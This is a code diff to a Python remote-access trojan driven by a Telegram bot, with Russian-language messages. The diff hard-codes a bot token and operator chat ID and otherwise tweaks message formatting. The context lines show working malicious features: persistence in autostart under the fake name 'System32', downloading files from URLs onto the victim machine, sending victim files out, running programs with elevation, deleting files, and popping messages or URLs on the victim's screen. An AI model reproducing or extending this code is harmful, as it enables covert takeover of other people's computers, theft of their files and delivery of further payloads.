@@ -32,15 +32,17 @@ from win32gui import GetWindowText, GetForegroundWindow
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from subprocess import Popen, PIPE
 
+
 #Прокси (Если не работает)
 #apihelper.proxy = {'https':'socks5://x.x.x.x:xxxx'}
+
+#Токен/Айди
+token = '1234526486:AAGhBdDUBc9M8XsuJCe7VUrbLXftBdC54cE'
+adm = '643200553'
 
 #Название файла при копировании в автозагрузку
 fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
-#Токен/Айди
-token = 'Токен'
-adm = 'Айди'
 
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=30)
@@ -727,11 +729,11 @@ def cd(command):
   bot.send_chat_action(command.chat.id, 'typing')
   msg = re.split('/CD ', command.text, flags=re.I)[1]
   os.chdir(msg)
-  bot.send_message(command.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Директория изменена*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*Директория не найдена*', parse_mode="Markdown")
  except:
-  bot.send_message(command.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Текущая директория*\n\n`' + os.getcwd() + '`', parse_mode="Markdown")
 
 @bot.message_handler(regexp='Remove')
 def remove(command):
@@ -784,7 +786,7 @@ def remove(command):
   except PermissionError:
   	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-  	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
+  	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='RemoveAll')
 def removeall(command):
@@ -830,13 +832,13 @@ def upload(command):
   file_name = 'C:\\ProgramData\\Files\\' + r.info().get_filename()
   bot.send_message(command.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
   urllib.request.urlretrieve(url, file_name)
-  bot.reply_to(command, '*Файл загружен на компьютер!*\n \n`' + file_name + '`', parse_mode="Markdown")
+  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`' + file_name + '`', parse_mode="Markdown")
  except urllib.error.HTTPError as err:
   bot.send_message(command.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
  except ValueError:
   bot.send_message(command.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
  except:
-  bot.send_message(command.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n› /Upload*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n\n› /Upload*', parse_mode="Markdown")
 
 @bot.message_handler(content_types=['document'])
 def document(command):
@@ -847,7 +849,7 @@ def document(command):
   src='C:\\ProgramData\\Files\\'+file_info.file_path;
   with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
-  bot.reply_to(command, '*Файл загружен на компьютер!*\n \n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
+  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
  except FileNotFoundError:
   bot.reply_to(command, '*Формат файла не поддерживается*', parse_mode="Markdown")
  except:
@@ -882,7 +884,7 @@ def download(command):
         os.remove('C:\\ProgramData\\' + msg + '.zip')
         bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
     except:
-        bot.send_message(command.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
+        bot.send_message(command.chat.id, '*Введите название файла\n\n› /Download*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='Run')
 def run(command):
@@ -894,7 +896,7 @@ def run(command):
  except FileNotFoundError:
  	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
- 	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='RunAS')
 def runas(command):
@@ -908,14 +910,14 @@ def runas(command):
  except FileNotFoundError:
  	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
- 	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='Ls')
 def ls(command):
  try:
   bot.send_chat_action(command.chat.id, 'typing')
   dirs = '\n``'.join(os.listdir(path="."))
-  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + dirs + '`', parse_mode="Markdown")
  except:
   try:
     bot.send_chat_action(command.chat.id, 'typing')
@@ -967,7 +969,7 @@ def message(command):
   ctypes.windll.user32.MessageBoxW(0, msg, u'Information', 0x10)
   bot.reply_to(command, '*Сообщение отправленно!*', parse_mode="Markdown")
  except:
-  bot.send_message(command.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Введите сообщение\n\n› /Message*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='OpenURL')
 def openurl(command):
@@ -978,7 +980,7 @@ def openurl(command):
   webbrowser.open_new_tab(url)
   bot.reply_to(command, '*Ссылка открыта!*', parse_mode="Markdown")
  except:
-  bot.send_message(command.chat.id, '*Вставьте ссылку\n \n› /OpenURL*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Вставьте ссылку\n\n› /OpenURL*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='Wallpapers')
 def wallpapers(command):
@@ -1001,7 +1003,7 @@ def wallpapers(command):
 
 @bot.message_handler(regexp='Voice')
 def voice(command):
- bot.send_message(command.chat.id, '*Введите текст\n \n› /Say*', parse_mode="Markdown")
+ bot.send_message(command.chat.id, '*Введите текст\n\n› /Say*', parse_mode="Markdown")
 
 @bot.message_handler(regexp='Say')
 def say(command):
